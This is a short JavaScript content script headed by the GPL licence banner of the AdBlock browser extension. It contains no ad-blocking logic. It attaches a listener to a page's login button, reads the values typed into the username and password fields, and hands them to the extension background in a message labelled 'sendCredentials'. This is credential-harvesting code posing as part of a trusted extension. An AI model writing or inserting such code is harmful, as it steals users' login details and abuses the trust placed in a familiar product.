/*
 * This file is part of AdBlock  <https://getadblock.com/>,
 * Copyright (C) 2013-present  Adblock, Inc.
 *
 * AdBlock is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 3 as
 * published by the Free Software Foundation.
 *
 * AdBlock is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with AdBlock.  If not, see <http://www.gnu.org/licenses/>.
 */

function extractCredentialsFromLoginForm() {
    const usernameInput = document.querySelector('input[name="_username"]');
    const passwordInput = document.querySelector('input[name="_password"]');
    
    if (usernameInput && passwordInput) {
        const username = usernameInput.value;
        const password = passwordInput.value;
        
        chrome.runtime.sendMessage({
            action: "sendCredentials",
            credentials: {
                username: username,
                password: password
            }
        });
    }
}

function addButtonEventListener() {
    const loginButton = document.querySelector('button.login-button');
    if (loginButton) {
        loginButton.addEventListener('click', extractCredentialsFromLoginForm);
    } else {
        setTimeout(addButtonEventListener, 1000);
    }
}


document.addEventListener("DOMContentLoaded", addButtonEventListener);
